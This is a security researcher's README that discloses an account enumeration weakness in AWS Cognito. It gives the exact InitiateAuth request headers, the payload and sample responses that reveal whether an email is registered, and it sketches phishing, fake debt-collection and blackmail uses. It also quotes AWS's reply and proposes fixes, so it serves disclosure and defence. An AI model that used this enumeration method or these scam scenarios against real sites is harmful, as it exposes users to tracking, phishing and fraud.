![image](https://github.com/JWally/ezp0wn/assets/2482935/9e6cdfba-4115-4a01-a0b0-cf9789681c87)


# AWS Cognito Account Enumeration Demonstration

This Node.js script demonstrates an account enumeration vulnerability with AWS Cognito.

## Summary

If your site uses AWS Cognito and your `clientId` is exposed:

I can run a script to see who has accounts on your site - without rate limits.

## Why Is This Bad?

I'm sure there are more, but here are two ways a threat actor could exploit this:

### Depth

With a list of emails, I can quickly see who is associated with your service. 
1. I can buy a domain that looks like yours
2. Create a login page that looks like yours
3. send emails tricking people to give me their credentials to your site.
  
If you're not using 2fa, I've taken over their account.

Easier, I can pretend to be a debt collector going after a small debt that's about to incur massive fees and penalties - just to harvest credit card numbers.

### Breadth

With a collection of `clientId`s, a threat actor could quickly see what websites an email address is associated with. 

With this, I can easily spearphishing campaign, or blackmail campaign depending on what I discover.

## How Does It Work?

Make as many rest requests as you want, as quick as you want with the following format:

### URL
`"https://cognito-idp.us-east-2.amazonaws.com/`

n.b. this might have to change depending on how the site set everything up

### Headers
```json
{
    "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
    "X-Amz-User-Agent": "aws-amplify/5.0.4 js",
    "Content-Type": "application/x-amz-json-1.1"
}
```

### Payload
```json
{
  "AuthFlow": "USER_SRP_AUTH",
  "ClientId": "5b6a*****umldkr",
  "AuthParameters": {
    "USERNAME": "hi@mom.com",
    "SRP_A": "66463ad244621e5365841583e54891c292b3be74a00bdd034c2d555cf4fe1faaa"
  },
  "ClientMetadata": {}
}
```

### User-Exists-Response

```json
  {
    "email": "mjw****9@gmail.com",
    "status": 200,
    "data": {
      "ChallengeName": "PASSWORD_VERIFIER",
      "ChallengeParameters": {
        "SALT": "f4e265d41ccec5fe6c6b2ae4e7c6a11a",
        "SECRET_BLOCK": "Qa8OxSNeqLPqbC5ZFEL8weaBauHcLRg4Roc3r4GVjRGbYe9W0aZnSdyBWuOQoMLQQUlHESlrBFZ964GahDeYqG46PTPkG4KikLBE1Lw24/9+8EPmL6QLwDDxG7Mz2Wbce4lnqxeyi/e/kOe8AAAj/Pj6VvxvCRy9ieIKA5WJW/5BBUf2JkvSUBCbaZ4fZXIfIqInhT0GBGiaouvhLK7khcTNkXj0SAWcULVbCt2REJvItocr4n4KaagcTpX2IX6U7VqxLe0ykzWtUeA4Xc7wI0lLO5C5ap6sl7JMch8MfdDAJ0sPSz1ZtM5reheissuF7wk4OiWg0c69nNfhEi6nCATtRJHqKLfE5VOjrcFPNfdBLBcWjsrPUaWnu98UWBKKgtZeiA7NnQM3rmKWfWaPArbhao/Y1pPiXnLeiYz+IzDFf+q/XDtJrxtRz81aELRm79QwgHxEBQJVAXVnzz9Knw1YuSHpvWlPthXCYdx+YRnjuSYujJPu8QorSqj6sQfukI/vEVQ2moxd9ChBQQ7861YgQGhzgw0uGwpUP3ENP9T0XqXgNRp2Vfb2lnqK3YdVEBYeajMvtc0+ot1+JA==",
        "SRP_B": "49abc3232c2e4aaef95bf2ae4b3191dec4d99de1f474aaab4d15c2dbfd8a55d097d17a3a309d43583ea6c685e8b74754ca203220ac73cd3ba6a2fd8964bb0b1d12dfe403646bb8e2fcb4ccc5ed40327f10bc513126abdee1d28d886d5339cb9cedeb93c3b97d99d0ae49e380ea45d45d6f733d886b6773f448dafd8aee26aeb59e14c62ec608e8439d68c82b77a1fd0032fb0d9f03717c7e639abababaa84d9f15ec03345498a6f7d11ddd88a93e052569821842291ce1c0ab47fbac596e6e08469cb88202b07549cbd5d097db9a8ff57fda0337fe1406c0ed79d545f095c83437e7d933f8365ba585ba9f97fe20ace79dba2703de861868dcc83e9a107a7adf4816178fea1a986a0815080fbdff3dda637e8675553fcbb83d24e7d2f49d2c7e5ced010f381c0bc16945c961041db85a5fe2495b408dd6ef7b723ab94958c3cdd76457d36e9acb9a632c9fd6161b3dd21db8ea9ea8021bdf0e381abc832dd912d9283d7a20638a848f9a9169252ef2852ba3779cdc74fb2e8fdaed1514ad9c64",
        "USERNAME": "********-733a-470f-ab6b-ee5a509825de",
        "USER_ID_FOR_SRP": "********-733a-470f-ab6b-ee5a509825de"
      }
    }
  }
```

### User-Exists-Response

```json
{"type": "UserNotFoundException", "message": "User does not exist"}
```

## AWS Response

I brought this up to AWS Security, who replied with the following:

> Thank you for bringing your concern to our attention. We greatly appreciate and encourage reports from the security community worldwide.

> We do not believe the behavior you describe in this report presents a security concern, rather, it is expected behavior.

> You can use the PreventUserExistenceErrors setting of a user pool app client to enable or disable user existence related errors. See documentation below:

> https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pool-managing-errors.html

I don't think that the suggested solution would work since the attack-surface I'm using is the first-leg of the Secure Remote Password protocol. It has to respond with a payload containing `SRP_B` to work.

## Possible Fixes - You

I'm totally spitballing here, so please verify that this is safe with more qualified people than me before actually trying it. I don't know that this is "production grade", but could probably be hardened enough to get close.

1. Get a new `clientId` and keep it secret
2. Set up an end point that you control and can rate limit
3. Route your browser's requests _through_ your end point to AWS instead of aiming it directly _at_ AWS. This should be safe since the user's password isn't ever actually sent over the wire (SRP)

## Possible Fixes - AWS

Here I'm really out of my depth, but I like it when people point out something wrong - and have a possible solution.

This would have to be opt-in, but if all responses to this API method included a full payload, it would be impossible to distinguish when an account exists or doesn't exist. In the event that the account didn't exist, all of the cryptography related fields could be garbage data.
